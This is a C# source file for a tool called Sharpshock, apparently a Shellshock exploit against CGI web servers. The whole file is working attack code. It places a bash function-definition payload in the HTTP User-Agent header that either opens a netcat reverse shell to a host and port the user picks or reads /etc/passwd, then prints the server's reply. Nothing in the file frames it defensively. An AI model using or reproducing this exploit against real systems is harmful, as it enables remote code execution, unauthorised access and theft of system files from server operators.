using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Net;
using System.IO;
using System.Diagnostics;
using System.Web;

namespace Sharpshock
{
    class sendCommand
    {
        public void shellshock(string website, string filePath)
        {

            var shellOrEtc = 0;
            var userAgent = "";

            var lhost = "";
            var port = 0;

            website = website + filePath;


            if (website.Substring(0, 7) != "http://")
                website = "http://" + website;
            

            var request = (HttpWebRequest)WebRequest.Create(website);

            Console.WriteLine();

            Console.WriteLine("{0}[+] Testing {1} ",Environment.NewLine, website);

            Console.WriteLine("{0}[+] Reverse shell [1] or read /etc/passwd [2]", Environment.NewLine);
            shellOrEtc = Int32.Parse(Console.ReadLine());


            if (shellOrEtc == 1)
            {
                Console.WriteLine(Environment.NewLine+"[+] Pick a host:");
                lhost = Console.ReadLine();

                Console.WriteLine(Environment.NewLine + "[+] Pick a port");
                port = Int32.Parse(Console.ReadLine());

                Console.WriteLine("{0}[+] Listener: {1}", Environment.NewLine, lhost);
                Console.WriteLine("[+] Port: {0}",port );

                userAgent = "() { :;}; /bin/bash -c 'nc " + lhost + " " + port + " -e /bin/bash -i'";

                Console.WriteLine("{0}[+] You need Netcat for this feature.{1}[+] After downloading Netcat run this command before hitting enter:", Environment.NewLine,Environment.NewLine);
                Console.WriteLine(@"[+] .\nc - vlp {0}",port);
                Console.WriteLine("{0}[+] Press enter to start the attack", Environment.NewLine);

                Process.Start("cmd.exe");
                Console.ReadKey();

                Console.WriteLine("[+] Spawning a shell.");
            }
            else
            {
                userAgent = "() { :;}; echo; /bin/cat /etc/passwd";
                Console.WriteLine("{0}Reading /etc/passwd...:{1}{2}",Environment.NewLine, Environment.NewLine,Environment.NewLine);
            }
            request.UserAgent = userAgent;
            try
            {
                var responseReader = new StreamReader(request.GetResponse().GetResponseStream());
                var responseData = responseReader.ReadToEnd();
                Console.WriteLine(responseData);
            }
            catch
            {
                Console.WriteLine("{0}[+] Connection lost",Environment.NewLine);
                Console.WriteLine("{0}Press enter to exit",Environment.NewLine);
            }
        }
    }
}
